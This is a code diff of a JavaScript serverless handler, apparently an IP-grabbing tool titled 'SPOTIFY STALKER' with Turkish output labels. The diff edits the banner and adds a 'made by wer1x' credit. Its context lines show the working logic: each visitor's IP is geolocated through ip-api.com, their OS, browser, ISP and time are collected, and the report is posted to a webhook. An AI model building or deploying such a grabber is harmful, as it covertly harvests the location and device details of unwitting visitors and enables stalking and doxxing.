@@ -41,7 +41,7 @@ module.exports = async (req, res) => {
     try { geo = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=city,country,isp,org,as,query'); } catch(e) {}
 
     const lines = [
-      '**SPOTIFY STALKER!**',
+      '**SPOTIFY STALKERi !!!**',
       '',
       '**IP :** ' + ip,
       '**Konum :** ' + (geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor'),
@@ -50,7 +50,9 @@ module.exports = async (req, res) => {
       '**İşletim Sistemi :** ' + (os.name || 'Bilinmiyor') + (os.version ? ' ' + os.version : ''),
       '**Tarayıcı :** ' + (browser.name || 'Bilinmiyor') + (browser.version ? ' ' + browser.version : ''),
       '**ISS :** ' + (geo.isp || geo.org || 'Bilinmiyor'),
-      '**Tarih :** ' + new Date().toLocaleString('tr-TR')
+      '**Tarih :** ' + new Date().toLocaleString('tr-TR'),
+      '',
+      '                                                        made by wer1x'
     ];
 
     await postJSON(WEBHOOK, { content: lines.join('\n') });
